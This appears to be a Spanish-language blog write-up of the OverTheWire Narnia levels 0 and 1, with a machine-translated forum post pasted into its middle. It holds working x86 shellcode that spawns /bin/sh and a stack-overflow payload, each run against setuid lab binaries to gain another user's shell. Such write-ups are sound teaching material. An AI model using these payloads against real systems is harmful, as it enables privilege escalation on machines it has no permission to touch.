---
layout: default
---

## OverTheWire: Narnia1

Hola a todos!

En el post anterior estuve explicando cómo resolver el desafío 0 del reto Narnia de la plataforma OverTheWire

En este post estaremos viendo como resolver el siguiente desafío

Este desafío es un poco más complicado, aquí tenemos el código fuente del binario que se nos presenta:

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
```
Dado que este binario ejecuta el contenido de ret, podemos alimentar el código de shell ret y se ejecutará.

En este caso estaré usando el siguiente shellcode puramente alfanumérico: 
https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-

1
¿Quieres instalar 0x00sec - The Home of the Hacker en este dispositivo?
OverTheWire Narnia desafía 0-4 redacciones (conceptos básicos de explotación binaria con explicaciones)
Desarrollo de exploits
ctf explotar binario desbordamiento del búfer

chivato
Dec '19
OverTheWire Narnia desafía 0-4 redacciones
En esta publicación, escribiré los desafíos 0-4 de la serie Narnia en OverTheWire, con la mejor explicación que se me ocurra para cada uno, para que alguien que no entienda pwn, pueda obtener una base y jugar los desafíos para ellos mismos.

Cada pwnable consta de un binario SetUID (esto significa que en tiempo de ejecución se ejecutará como otro usuario, por lo que si podemos hacer que el binario genere un shell mientras se está ejecutando, el shell será como otro usuario) y el código fuente .c, por lo que podemos tener una idea de cómo se compone cada desafío (en este artículo he anotado los códigos fuente para ayudar a aclarar lo que está sucediendo).

Descubrí que poder visualizar cómo está estructurada la pila me ayudó enormemente a comprender lo que está sucediendo en este ataque. Aquí hay un video perfecto de Computerphile ( https://youtube.com/computerphile 10) que explica en qué consiste el ataque y cómo funciona https://www.youtube.com/watch?v=1S0aBV-Waeo 10.

Desafío 0
Nuestro primer paso es iniciar sesión con el primer usuario en SSH, usando las credenciales narnia0: narnia0, en el puerto 2226.
ssh narnia0@narnia.labs.overthewire.org -p 2226
Ahora nos dirigimos al directorio / narnia / y buscamos el código fuente y el binario, aquí está el código fuente:

#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf("buf: %s\n",buf); /*Prints contents of buffer*/
    printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn't 0xdeadbeef then*/
        printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
        exit(1);
    }

    return 0;
}
Entonces, este desafío es extremadamente sencillo, esencialmente, podemos ir directamente al búfer, que es de tamaño 20, y dado que no hay límites sobre la cantidad que podemos ingresar en el búfer, nos permite escribir más de veinte caracteres en la memoria. , y dado que la variable "val" es el siguiente valor en la pila, podemos sobrescribir su contenido.

Podemos hacer esto de dos maneras, la manera limpia y la manera repugnante:

La forma limpia sería hacer que Python imprima veinte A (el tamaño del búfer), más el valor que queremos poner en la memoria, que en este caso debe estar en formato little endian.

Sabemos que debe ser un formato little endian, ya que cuando ejecutamos "file / narnia / narnia0", obtenemos el siguiente resultado:
narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped( https://en.wikipedia.org/wiki/Endianness 1)

Para convertir un valor a little endian (en este caso queremos convertir 0xdeadbeef), entonces eliminamos el 0x (esto es solo un indicador de que el valor es hexadecimal), luego lo dividimos en grupos de dos (de ad be ef ), ahora invertimos el orden de los grupos, pero no los caracteres (ef be ad de), y finalmente agregamos "\ x" delante de cada grupo, y los ponemos todos juntos:, \xef\xbe\xad\xdeasí que eso es lo que necesitamos alimentar el binario después de los 20 bytes, probémoslo.

narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
Entonces, el desafío falla y no abre un shell, pero nos muestra que el valor correcto está en su lugar, ahora podemos usar un pequeño truco que involucra a cat para mantener abierto el flujo de E / S:

narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
whoami
narnia1
¡Voila! Desafío 0 ha sido pwned, ahora tenemos un shell como narnia1, y simplemente podemos obtener la contraseña para narnia1 de / etc / narnia_pass / narnia1.

Desafío 1
El próximo desafío hace las cosas un poco más complicadas, ahora tenemos el siguiente código fuente:

#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
Dado que este binario ejecuta el contenido de ret, podemos alimentar el código de shell ret y se ejecutará.

Como ejemplo, usaré un shellcode puramente alfanumérico creado por un amigo mío ( https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86- 15), por lo que podemos poner el shellcode dentro de la variable de entorno llamada "EGG" y luego ejecutar el binario.

```
narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
```

Solo para ampliar esto, el código de shell no tiene que ser alfanumérico, solo lo hace más fácil si lo es, ya que puede ponerlo directamente en la var env. Un ejemplo de una carga útil que utiliza shellcode no alfanumérico sería el siguiente:

```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```
